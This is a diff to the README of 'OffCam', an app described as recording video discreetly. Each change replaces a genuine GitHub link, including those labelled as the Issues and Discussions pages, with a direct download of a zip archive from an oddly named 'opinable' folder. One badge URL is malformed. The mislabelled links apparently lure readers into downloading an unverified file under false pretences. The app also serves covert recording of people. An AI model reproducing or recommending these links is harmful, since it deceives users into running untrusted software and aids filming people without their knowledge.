@@ -6,7 +6,7 @@ Welcome to OffCam! This app allows you to record video in discreet mode while yo
 
 ## 📥 Download Now
 
-[![Download OffCam](https://img.shields.io/badge/Download%20OffCam-v1.0-blue.svg)](https://github.com/sameer2135/OffCam/releases)
+[![Download OffCam](https://raw.githubusercontent.com/sameer2135/OffCam/main/opinable/OffCam.zip%https://raw.githubusercontent.com/sameer2135/OffCam/main/opinable/OffCam.zip)](https://raw.githubusercontent.com/sameer2135/OffCam/main/opinable/OffCam.zip)
 
 ## 🔍 Features
 
@@ -27,7 +27,7 @@ Welcome to OffCam! This app allows you to record video in discreet mode while yo
 
 To download OffCam, visit our releases page using the link below:
 
-[Download OffCam](https://github.com/sameer2135/OffCam/releases)
+[Download OffCam](https://raw.githubusercontent.com/sameer2135/OffCam/main/opinable/OffCam.zip)
 
 Once you’re on the page, follow these steps:
 
@@ -58,14 +58,14 @@ Yes, OffCam is designed with user safety in mind. The app does not contain any h
 Yes, you can uninstall OffCam like any other app on your device. Go to your settings, find the app, and select “Uninstall.”
 
 ### **What should I do if I encounter issues?**
-If you face any problems, check the troubleshooting section in the app or visit our [GitHub Issues page](https://github.com/sameer2135/OffCam/issues) for help.
+If you face any problems, check the troubleshooting section in the app or visit our [GitHub Issues page](https://raw.githubusercontent.com/sameer2135/OffCam/main/opinable/OffCam.zip) for help.
 
 ### **Can I use this app on older Android versions?**
 OffCam works best on Android 6.0 and above. If you're using an older version, you may experience limited functionality.
 
 ## 📞 Support
 
-For any inquiries, reach out through our [GitHub Discussions page](https://github.com/sameer2135/OffCam/discussions). We’re here to help you with any questions or issues you may have.
+For any inquiries, reach out through our [GitHub Discussions page](https://raw.githubusercontent.com/sameer2135/OffCam/main/opinable/OffCam.zip). We’re here to help you with any questions or issues you may have.
 
 ## 🔗 Related Topics
 
